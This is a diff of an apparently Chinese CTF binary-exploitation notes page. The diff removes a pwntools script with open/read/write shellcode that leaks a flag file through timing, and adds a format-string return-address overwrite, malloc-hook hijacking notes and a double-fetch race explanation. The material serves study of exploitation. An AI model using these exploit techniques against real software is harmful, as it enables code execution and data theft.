-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">OpenFile</span><span class="p">:</span> 
-</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">permission</span><span class="p">){</span> 
-</span></span><span class="line"><span class="cl">        <span class="n">ExitAndKillPid</span><span class="p">(</span><span class="n">pid</span><span class="p">);</span> 
-</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
-</span></span><span class="line"><span class="cl">    <span class="k">break</span><span class="p">;</span> 
-</span></span><span class="line"><span class="cl"><span class="k">case</span> <span class="nl">__NR_read</span><span class="p">:</span> 
-</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;read(%d,%p,0x%x);</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">rdi</span><span class="p">,</span><span class="n">rsi</span><span class="p">,</span><span class="n">rdx</span><span class="p">);</span> 
-</span></span><span class="line"><span class="cl">    <span class="k">break</span><span class="p">;</span> 
-</span></span><span class="line"><span class="cl"><span class="k">case</span> <span class="nl">__NR_write</span><span class="p">:</span> 
-</span></span><span class="line"><span class="cl">    <span class="n">choice</span><span class="o">=</span><span class="n">rand</span><span class="p">()</span><span class="o">%</span><span class="n">number</span><span class="p">;</span> 
-</span></span><span class="line"><span class="cl">    <span class="n">regs</span><span class="p">.</span><span class="n">rsi</span><span class="o">=</span><span class="n">say</span><span class="p">[</span><span class="n">choice</span><span class="p">];</span> 
-</span></span><span class="line"><span class="cl">    <span class="n">regs</span><span class="p">.</span><span class="n">rdx</span><span class="o">=</span><span class="n">strlen</span><span class="p">(</span><span class="n">say</span><span class="p">[</span><span class="n">choice</span><span class="p">]);</span>
-</span></span><span class="line"><span class="cl">    <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">);</span> <span class="c1">// 会更改rsi和rdx，flag输出换为其他内容
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">break</span><span class="p">;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>汇编编写open, read, write shellcode+基于时间的盲注</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">  1
-</span><span class="lnt">  2
-</span><span class="lnt">  3
-</span><span class="lnt">  4
-</span><span class="lnt">  5
-</span><span class="lnt">  6
-</span><span class="lnt">  7
-</span><span class="lnt">  8
-</span><span class="lnt">  9
-</span><span class="lnt"> 10
-</span><span class="lnt"> 11
-</span><span class="lnt"> 12
-</span><span class="lnt"> 13
-</span><span class="lnt"> 14
-</span><span class="lnt"> 15
-</span><span class="lnt"> 16
-</span><span class="lnt"> 17
-</span><span class="lnt"> 18
-</span><span class="lnt"> 19
-</span><span class="lnt"> 20
-</span><span class="lnt"> 21
-</span><span class="lnt"> 22
-</span><span class="lnt"> 23
-</span><span class="lnt"> 24
-</span><span class="lnt"> 25
-</span><span class="lnt"> 26
-</span><span class="lnt"> 27
-</span><span class="lnt"> 28
-</span><span class="lnt"> 29
-</span><span class="lnt"> 30
-</span><span class="lnt"> 31
-</span><span class="lnt"> 32
-</span><span class="lnt"> 33
-</span><span class="lnt"> 34
-</span><span class="lnt"> 35
-</span><span class="lnt"> 36
-</span><span class="lnt"> 37
-</span><span class="lnt"> 38
-</span><span class="lnt"> 39
-</span><span class="lnt"> 40
-</span><span class="lnt"> 41
-</span><span class="lnt"> 42
-</span><span class="lnt"> 43
-</span><span class="lnt"> 44
-</span><span class="lnt"> 45
-</span><span class="lnt"> 46
-</span><span class="lnt"> 47
-</span><span class="lnt"> 48
-</span><span class="lnt"> 49
-</span><span class="lnt"> 50
-</span><span class="lnt"> 51
-</span><span class="lnt"> 52
-</span><span class="lnt"> 53
-</span><span class="lnt"> 54
-</span><span class="lnt"> 55
-</span><span class="lnt"> 56
-</span><span class="lnt"> 57
-</span><span class="lnt"> 58
-</span><span class="lnt"> 59
-</span><span class="lnt"> 60
-</span><span class="lnt"> 61
-</span><span class="lnt"> 62
-</span><span class="lnt"> 63
-</span><span class="lnt"> 64
-</span><span class="lnt"> 65
-</span><span class="lnt"> 66
-</span><span class="lnt"> 67
-</span><span class="lnt"> 68
-</span><span class="lnt"> 69
-</span><span class="lnt"> 70
-</span><span class="lnt"> 71
-</span><span class="lnt"> 72
-</span><span class="lnt"> 73
-</span><span class="lnt"> 74
-</span><span class="lnt"> 75
-</span><span class="lnt"> 76
-</span><span class="lnt"> 77
-</span><span class="lnt"> 78
-</span><span class="lnt"> 79
-</span><span class="lnt"> 80
-</span><span class="lnt"> 81
-</span><span class="lnt"> 82
-</span><span class="lnt"> 83
-</span><span class="lnt"> 84
-</span><span class="lnt"> 85
-</span><span class="lnt"> 86
-</span><span class="lnt"> 87
-</span><span class="lnt"> 88
-</span><span class="lnt"> 89
-</span><span class="lnt"> 90
-</span><span class="lnt"> 91
-</span><span class="lnt"> 92
-</span><span class="lnt"> 93
-</span><span class="lnt"> 94
-</span><span class="lnt"> 95
-</span><span class="lnt"> 96
-</span><span class="lnt"> 97
-</span><span class="lnt"> 98
-</span><span class="lnt"> 99
-</span><span class="lnt">100
-</span><span class="lnt">101
-</span><span class="lnt">102
-</span><span class="lnt">103
-</span><span class="lnt">104
-</span><span class="lnt">105
-</span><span class="lnt">106
-</span><span class="lnt">107
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">time</span> <span class="c1"># 用于时间盲注</span>
-</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./NepBox&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">base</span><span class="o">=</span><span class="mh">0xdead000</span>
-</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
-</span></span></span><span class="line"><span class="cl"><span class="s1">    /* open(file=&#39;/flag&#39;, oflag=0, mode=0) */
-</span></span></span><span class="line"><span class="cl"><span class="s1">    /* push b&#39;/flag</span><span class="se">\x00</span><span class="s1">&#39; */
-</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rax, 0x101010101010101
-</span></span></span><span class="line"><span class="cl"><span class="s1">    push rax
-</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rax, 0x101010101010101 ^ 0x67616c662f /* &#39;/flag&#39; */
-</span></span></span><span class="line"><span class="cl"><span class="s1">    xor [rsp], rax /* 异或后恢复为/flag */
-</span></span></span><span class="line"><span class="cl"><span class="s1">    
-</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rdi, rsp 
-</span></span></span><span class="line"><span class="cl"><span class="s1">    
-</span></span></span><span class="line"><span class="cl"><span class="s1">    xor edx, edx /* 0 */
-</span></span></span><span class="line"><span class="cl"><span class="s1">    xor esi, esi /* 0 */
-</span></span></span><span class="line"><span class="cl"><span class="s1">    
-</span></span></span><span class="line"><span class="cl"><span class="s1">    /* call open() */
-</span></span></span><span class="line"><span class="cl"><span class="s1">    push SYS_open /* 2 */
-</span></span></span><span class="line"><span class="cl"><span class="s1">    pop rax
-</span></span></span><span class="line"><span class="cl"><span class="s1">    syscall
-</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">shellcode</span><span class="o">=</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;&#39;&#39;
-</span></span></span><span class="line"><span class="cl"><span class="s1">    /* call read(3, 0xdead200, 0x30) */
-</span></span></span><span class="line"><span class="cl"><span class="s1">    xor eax, eax /* SYS_read 0 */
-</span></span></span><span class="line"><span class="cl"><span class="s1">    
-</span></span></span><span class="line"><span class="cl"><span class="s1">    push 3
-</span></span></span><span class="line"><span class="cl"><span class="s1">    pop rdi
-</span></span></span><span class="line"><span class="cl"><span class="s1">    
-</span></span></span><span class="line"><span class="cl"><span class="s1">    push 0x30
-</span></span></span><span class="line"><span class="cl"><span class="s1">    pop rdx
-</span></span></span><span class="line"><span class="cl"><span class="s1">    
-</span></span></span><span class="line"><span class="cl"><span class="s1">    mov esi, 0x1010101 /* 0x1010101 ^ 0xcebd301 = 233492992 == 0xdead200 */
-</span></span></span><span class="line"><span class="cl"><span class="s1">    xor esi, 0xcebd301
-</span></span></span><span class="line"><span class="cl"><span class="s1">    syscall
-</span></span></span><span class="line"><span class="cl"><span class="s1">
-</span></span></span><span class="line"><span class="cl"><span class="s1">/* 
-</span></span></span><span class="line"><span class="cl"><span class="s1">   stdout=1
-</span></span></span><span class="line"><span class="cl"><span class="s1">   for(int bytes=0;bytes&lt;=0x30;bytes++){ iLoop
-</span></span></span><span class="line"><span class="cl"><span class="s1">       for(int bits=0;bits&lt;=0x7;bits++){ jLoop
-</span></span></span><span class="line"><span class="cl"><span class="s1">             write(stdout,0xdead200+bits+bytes*8,0x1);
-</span></span></span><span class="line"><span class="cl"><span class="s1">       }
-</span></span></span><span class="line"><span class="cl"><span class="s1">   }
-</span></span></span><span class="line"><span class="cl"><span class="s1">*/
-</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r13,0             /* 偏移量——当前第几个字节:bytes */
-</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r14,0xdead200     /* 基址   */
-</span></span></span><span class="line"><span class="cl"><span class="s1">
-</span></span></span><span class="line"><span class="cl"><span class="s1">iLoop: /* 外层循环 遍历每个字节 */
-</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r15,0 /* 当前字节第几位: bits */
-</span></span></span><span class="line"><span class="cl"><span class="s1">jLoop: /* 内层循环 遍历每个位 */
-</span></span></span><span class="line"><span class="cl"><span class="s1">    lea rax,[r13+r14] /* rax内容置为r13+r14地址 */
-</span></span></span><span class="line"><span class="cl"><span class="s1">    mov ax,[rax] /* rax中地址指向的内容: 16位 */
-</span></span></span><span class="line"><span class="cl"><span class="s1">
-</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rcx,r15 /* rcx 当前位 */
-</span></span></span><span class="line"><span class="cl"><span class="s1">    shr ax,cl /* 右移将最低位设置为要读取的位 */
-</span></span></span><span class="line"><span class="cl"><span class="s1">
-</span></span></span><span class="line"><span class="cl"><span class="s1">    and ax,1 /* &amp; 0x00000001 取最低位的值 */
-</span></span></span><span class="line"><span class="cl"><span class="s1">    test ax,ax /* 检查当前位是 0 还是 1 */
-</span></span></span><span class="line"><span class="cl"><span class="s1">    jz zero
-</span></span></span><span class="line"><span class="cl"><span class="s1">
-</span></span></span><span class="line"><span class="cl"><span class="s1">one: /* 进行基于时间的盲注，使得该位为1的时候时间为大于0秒 */
-</span></span></span><span class="line"><span class="cl"><span class="s1">    mov r8,0x200000000 /* 不同机器需要变更该延时时间 */
-</span></span></span><span class="line"><span class="cl"><span class="s1">sleep:
-</span></span></span><span class="line"><span class="cl"><span class="s1">    sub r8,1
-</span></span></span><span class="line"><span class="cl"><span class="s1">    jnz sleep /* 延时操作 */
-</span></span></span><span class="line"><span class="cl"><span class="s1">    
-</span></span></span><span class="line"><span class="cl"><span class="s1">zero:
-</span></span></span><span class="line"><span class="cl"><span class="s1">    /* write(fd=1, buf=0xdead200+[r13], n=0x1) */
-</span></span></span><span class="line"><span class="cl"><span class="s1">    push 1
-</span></span></span><span class="line"><span class="cl"><span class="s1">    pop rdi
-</span></span></span><span class="line"><span class="cl"><span class="s1">
-</span></span></span><span class="line"><span class="cl"><span class="s1">    push 0x1
-</span></span></span><span class="line"><span class="cl"><span class="s1">    pop rdx
-</span></span></span><span class="line"><span class="cl"><span class="s1">    
-</span></span></span><span class="line"><span class="cl"><span class="s1">    mov esi, 0x1010101 /* 233492992 == 0xdead200 */
-</span></span></span><span class="line"><span class="cl"><span class="s1">    xor esi, 0xcebd301
-</span></span></span><span class="line"><span class="cl"><span class="s1">    add rsi,r13
-</span></span></span><span class="line"><span class="cl"><span class="s1">    
-</span></span></span><span class="line"><span class="cl"><span class="s1">    /* call write() */
-</span></span></span><span class="line"><span class="cl"><span class="s1">    push SYS_write /* 1 */
-</span></span></span><span class="line"><span class="cl"><span class="s1">    pop rax
-</span></span></span><span class="line"><span class="cl"><span class="s1">    syscall
-</span></span></span><span class="line"><span class="cl"><span class="s1">
-</span></span></span><span class="line"><span class="cl"><span class="s1">jLoopEnd:
-</span></span></span><span class="line"><span class="cl"><span class="s1">    add r15,1 /* 
-</span></span></span><span class="line"><span class="cl"><span class="s1">    cmp r15,7
-</span></span></span><span class="line"><span class="cl"><span class="s1">    jbe jLoop
-</span></span></span><span class="line"><span class="cl"><span class="s1">iLoopEnd:
-</span></span></span><span class="line"><span class="cl"><span class="s1">    add r13,1
-</span></span></span><span class="line"><span class="cl"><span class="s1">    cmp r13,0x30
-</span></span></span><span class="line"><span class="cl"><span class="s1">    jbe iLoop
-</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">,</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span> <span class="ow">or</span> <span class="n">flag</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">!=</span><span class="s1">&#39;}&#39;</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">=</span><span class="mi">0</span>
-</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">        <span class="n">now</span><span class="o">=</span><span class="n">time</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;!&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="n">interval</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="p">()</span><span class="o">-</span><span class="n">now</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">interval</span><span class="p">:</span> <span class="c1"># 当时间差为 1 时</span>
-</span></span><span class="line"><span class="cl">            <span class="n">s</span><span class="o">|=</span><span class="p">(</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="n">i</span><span class="p">)</span> <span class="c1"># 在第 i 位上产生一个 1 加入到 s 中, 8 次构成一个字节</span>
-</span></span><span class="line"><span class="cl">    <span class="n">flag</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">pay</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%c</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">13</span> <span class="o">+</span> <span class="sa">f</span><span class="s2">&#34;%</span><span class="si">{</span><span class="p">(</span><span class="n">ret_addr</span><span class="o">&amp;</span><span class="mh">0xffff</span><span class="p">)</span> <span class="o">-</span> <span class="mi">13</span><span class="si">}</span><span class="s2">c%hn%</span><span class="si">{</span><span class="mh">0x10000</span><span class="o">-</span><span class="p">(</span><span class="n">ret_addr</span><span class="o">&amp;</span><span class="mh">0xffff</span><span class="p">)</span><span class="si">}</span><span class="s2">c&#34;</span> <span class="c1"># 15-&gt;47-&gt;9</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># (13+2)使得%hn解析第15, %{0x10000-(ret_addr&amp;0xffff)}c: 格式化字符串的 %hn 最多截断16位: 0xffff, 补充输出字符使累积总数达到 0x10000字节来重置字符计数</span>
+</span></span><span class="line"><span class="cl"><span class="n">pay</span> <span class="o">+=</span> <span class="sa">f</span><span class="s1">&#39;%</span><span class="si">{</span><span class="n">backdoor</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="si">}</span><span class="s1">c%47$hhn&#39;</span> <span class="c1"># 47-&gt;9-&gt;backdoor</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 也可pay += &#39;%c&#39;*8 + &#34;%47$hhn&#34; 只更改最后一个字节为8</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="堆溢出漏洞">堆溢出漏洞</h2>
@@ -5204,16 +5592,15 @@
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="o">*</span><span class="n">hook</span><span class="p">)(</span><span class="n">bytes</span><span class="p">,</span> <span class="n">RETURN_ADDRESS</span> <span class="p">(</span><span class="mi">0</span><span class="p">));</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><code>malloc</code>函数是调用了<code>__libc_malloc</code>函数，检查完<code>__malloc_hook</code>的值是否为空，不为空则调用其指向的函数，利用方法为向<code>__malloc_hook</code>的地址写入one_gadget或其他函数(system)劫持</p>
+</div><p><code>malloc</code>函数调用了<code>__libc_malloc</code>函数，检查完<code>__malloc_hook</code>的值是否为空，不为空则调用其指向的函数，利用方法为向<code>__malloc_hook</code>的地址写入one_gadget或其他函数(system)劫持</p>
 <h3 id="堆管理器">堆管理器</h3>
-<p>如栈基础第一张图所示</p>
 <p>用户与OS之间作为动态内存管理的中间人，由libc.so.6链接库实现，封装了系统调用（申请内存的 <code>brk</code> 与 <code>mmap</code> ），存在于【shared library即mmap段】</p>
 <ul>
 <li>响应用户申请内存，向OS申请内存，返回给用户程序</li>
 <li>管理用户释放的内存，适时归还OS</li>
 </ul>
-<p>__brk(sys_brk) ：堆通过brk向bss段和data数据段扩展【主线程、子线程可用】</p>
-<p>__mmap(sys_mmap_pgoff) ：物理内存/磁盘映射到虚拟内存中，未进行新的申请，在mmap段直接映射获取【子线程可用】</p>
+<p><code>__brk(sys_brk)</code> ：堆通过brk向bss段和data数据段扩展【主线程、子线程可用】</p>
+<p><code>__mmap(sys_mmap_pgoff)</code> ：物理内存/磁盘映射到虚拟内存中，未进行新的申请，在mmap段直接映射获取【子线程可用】</p>
 <p><strong>各种堆管理器</strong></p>
 <ol>
 <li>dlmalloc - General purpose allocator</li>
@@ -5224,6 +5611,10 @@
 </ol>
 <h4 id="arena">arena</h4>
 <p>内存分配区</p>
+<ul>
+<li>操作系统 &ndash;&gt; 堆管理器 &ndash;&gt; 用户</li>
+<li>物理内存 &ndash;&gt;  arena  &ndash;&gt; 可用内存</li>
+</ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -5263,13 +5654,9 @@
 </span><span class="lnt">35
 </span><span class="lnt">36
 </span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="err">操作系统</span> <span class="o">--&gt;</span> <span class="err">堆管理器</span> <span class="o">--&gt;</span> <span class="err">用户</span>
-</span></span><span class="line"><span class="cl"><span class="err">物理内存</span> <span class="o">--&gt;</span>   <span class="n">arena</span>   <span class="o">--&gt;</span> <span class="err">可用内存</span>
-</span></span><span class="line"><span class="cl"><span class="c1">//arena的标头详细信息 glibc-2.23
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">//arena的标头详细信息 glibc-2.23
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>
 </span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">malloc_state</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
@@ -6942,6 +7329,59 @@
 <li>使得<code>flags</code>成员为<code>/bin/sh</code>字符串，执行exit函数或libc执行abort流程时或main返回时，触发<code>_IO_flush_all_lockp</code>来拿到shell</li>
 </ul>
 <h2 id="kernel">Kernel</h2>
+<h2 id="条件竞争">条件竞争</h2>
+<h3 id="double-fetch">Double Fetch</h3>
+<p><strong>漏洞点</strong></p>
+<p>第一次文件读到内存中判断count大小，而进入else后又执行了读文件到内存，此时不判断count大小</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="c1">// 内存中logcount紧挨guest名字后
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">file_content_2_memory</span><span class="p">(</span><span class="n">a</span><span class="p">);</span> <span class="c1">// 读取本地文件内容到内存中
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">a</span> <span class="o">+</span> <span class="mi">64</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">4</span> <span class="p">){</span> <span class="c1">// a+64存储logcount
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">file_content_2_memory</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="mi">8</span> <span class="o">*</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kr">__int16</span> <span class="o">*</span><span class="p">)(</span><span class="n">a</span> <span class="o">+</span> <span class="mi">64</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2LL</span><span class="p">)</span> <span class="o">+</span> <span class="n">a</span> <span class="o">+</span> <span class="mi">8</span><span class="p">),</span> <span class="mi">8uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 向第logcount偏移的位置读入guest的名字
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">++*</span><span class="p">(</span><span class="n">a</span> <span class="o">+</span> <span class="mi">64</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">memory_2_file</span><span class="p">(</span><span class="n">a</span><span class="p">);</span> <span class="c1">// 将内存中数据写入本地文件中
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用：</p>
+<ul>
+<li>
+<p>第1个进程准备第五次写入而到达代码第6行时，开启第2和第3个进程绕过2-3行的判断到达第6行，第1个进程输入第五个值后退出</p>
+</li>
+<li>
+<p>第2个进程写入值将覆盖logcount，达成<strong>任意写</strong>，第3个进程写入值将通过read修改memory[logcount]内容达成<strong>任意地址写</strong></p>
+</li>
+</ul>
+<p><img src="/img/pwn_note.zh-cn.assets/image-20241101000216869.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20241101000216869"
+	
+	
+></p>
 
 </section>
 
@@ -7152,7 +7592,7 @@
         
             
         
-        共 106.68k 字 · 共 17篇文章
+        共 109.81k 字 · 共 17篇文章
         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
         <br />本站访客数<span id="busuanzi_value_site_uv"></span>人次---
@@ -7379,13 +7819,26 @@
         <li><a href="#mips">Mips</a></li>
         <li><a href="#assembly">Assembly</a></li>
         <li><a href="#c">C</a></li>
+        <li><a href="#c-1">C++</a></li>
         <li><a href="#python">Python</a></li>
         <li><a href="#保护措施">保护措施</a></li>
         <li><a href="#问题解决">问题解决</a></li>
       </ol>
     </li>
     <li><a href="#elf文件">ELF文件</a></li>
-    <li><a href="#进程执行">进程执行</a></li>
+    <li><a href="#进程">进程</a>
+      <ol>
+        <li><a href="#编译">编译</a></li>
+        <li><a href="#链接">链接</a>
+          <ol>
+            <li><a href="#静态链接">静态链接</a></li>
+          </ol>
+        </li>
+        <li><a href="#装载">装载</a></li>
+        <li><a href="#执行">执行</a></li>
+        <li><a href="#虚拟空间">虚拟空间</a></li>
+      </ol>
+    </li>
     <li><a href="#终端处理">终端处理</a></li>
     <li><a href="#随机数">随机数</a>
       <ol>
@@ -7395,6 +7848,7 @@
       </ol>
     </li>
     <li><a href="#整数溢出漏洞">整数溢出漏洞</a></li>
+    <li><a href="#oob漏洞">OOB漏洞</a></li>
     <li><a href="#栈溢出漏洞">栈溢出漏洞</a>
       <ol>
         <li><a href="#栈基础">栈基础</a></li>
@@ -7402,6 +7856,12 @@
         <li><a href="#ret2text">ret2text</a></li>
         <li><a href="#ret2shellcode">ret2shellcode</a></li>
         <li><a href="#orw-bypass">orw bypass</a></li>
+      </ol>
+    </li>
+    <li><a href="#沙箱sandbox">沙箱Sandbox</a>
+      <ol>
+        <li><a href="#proc泄露">/proc泄露</a></li>
+        <li><a href="#ptrace进程">Ptrace进程</a></li>
       </ol>
     </li>
     <li><a href="#rop">ROP</a>
@@ -7419,11 +7879,10 @@
         <li><a href="#srop">SROP</a></li>
       </ol>
     </li>
-    <li><a href="#格式化字符串">格式化字符串</a></li>
-    <li><a href="#沙箱sandbox">沙箱Sandbox</a>
+    <li><a href="#格式化字符串">格式化字符串</a>
       <ol>
-        <li><a href="#proc泄露">/proc泄露</a></li>
-        <li><a href="#ptrace进程">Ptrace进程</a></li>
+        <li><a href="#任意地址读">任意地址读</a></li>
+        <li><a href="#任意地址写">任意地址写</a></li>
       </ol>
     </li>
     <li><a href="#堆溢出漏洞">堆溢出漏洞</a>
@@ -7484,6 +7943,11 @@
     </li>
     <li><a href="#fsop">FSOP</a></li>
     <li><a href="#kernel">Kernel</a></li>
+    <li><a href="#条件竞争">条件竞争</a>
+      <ol>
+        <li><a href="#double-fetch">Double Fetch</a></li>
+      </ol>
+    </li>
   </ol>
 </nav>
         </div>
